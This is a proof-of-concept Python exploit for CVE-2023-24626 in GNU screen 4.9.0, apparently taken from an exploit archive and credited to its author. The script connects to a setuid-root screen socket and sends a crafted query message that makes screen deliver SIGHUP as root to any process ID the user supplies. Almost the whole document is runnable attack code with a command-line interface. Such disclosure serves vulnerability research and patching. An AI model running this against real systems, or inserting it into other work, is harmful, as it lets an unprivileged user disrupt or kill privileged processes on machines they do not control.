# Exploit Title: GNU screen v4.9.0 - Privilege Escalation
# Date: 03.02.2023
# Exploit Author: Manuel Andreas
# Vendor Homepage: https://www.gnu.org/software/screen/
# Software Link: https://ftp.gnu.org/gnu/screen/screen-4.9.0.tar.gz
# Version: 4.9.0
# Tested on: Arch Linux
# CVE : CVE-2023-24626

import os
import socket
import struct
import argparse
import subprocess
import pty
import time

SOCKDIR_TEMPLATE = "/run/screens/S-{}"
MAXPATHLEN = 4096
MAXTERMLEN = 32
MAXLOGINLEN = 256
STRUCTSIZE = 12584
MSG_QUERY   = 9

def find_latest_socket(dir):
    return f"{dir}/{sorted(os.listdir(dir))[-1]}"


def build_magic(ver=5):
    return ord('m') << 24 | ord('s') << 16 | ord('g') << 8 | ver


def build_msg(type):
    return struct.pack("<ii", build_magic(), type) + MAXPATHLEN * b"T"


def build_query(auser, nargs, cmd, apid, preselect, writeback):
    assert(len(auser) == MAXLOGINLEN + 1)
    assert(len(cmd) == MAXPATHLEN)
    assert(len(preselect) == 20)
    assert(len(writeback) == MAXPATHLEN)

    buf = build_msg(MSG_QUERY)

    buf += auser
    buf += 3 * b"\x00" #Padding
    buf += struct.pack("<i", nargs)
    buf += cmd
    buf += struct.pack("<i", apid)
    buf += preselect
    buf += writeback

    # Union padding
    buf += (STRUCTSIZE - len(buf)) * b"P"

    return buf


def spawn_screen_instance():
    # provide a pty
    mo, so = pty.openpty()
    me, se = pty.openpty()  
    mi, si = pty.openpty()  

    screen = subprocess.Popen("/usr/bin/screen", bufsize=0, stdin=si, stdout=so, stderr=se, close_fds=True, env={"TERM":"xterm"})

    for fd in [so, se, si]:
        os.close(fd)

    return screen


def main():
    parser = argparse.ArgumentParser(description='PoC for sending SIGHUP as root utilizing GNU screen configured as setuid root.')
    parser.add_argument('pid', type=int, help='the pid to receive the signal')

    args = parser.parse_args()

    pid = args.pid
    username = os.getlogin()

    screen = spawn_screen_instance()

    print("Waiting a second for screen to setup its socket..")
    time.sleep(1)

    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    socket_path = find_latest_socket(SOCKDIR_TEMPLATE.format(username))

    print(f"Connecting to: {socket_path}")
    s.connect(socket_path)

    print('Sending message...')
    msg = build_query(username.encode('ascii') + (MAXLOGINLEN + 1 - len(username)) * b"\x00", 0, MAXPATHLEN * b"E", pid, 20 * b"\x00", MAXPATHLEN * b"D")
    s.sendmsg([msg])

    s.recv(512)

    print(f'Ok sent SIGHUP to {pid}!')

    screen.kill()


if __name__ == '__main__':
    main()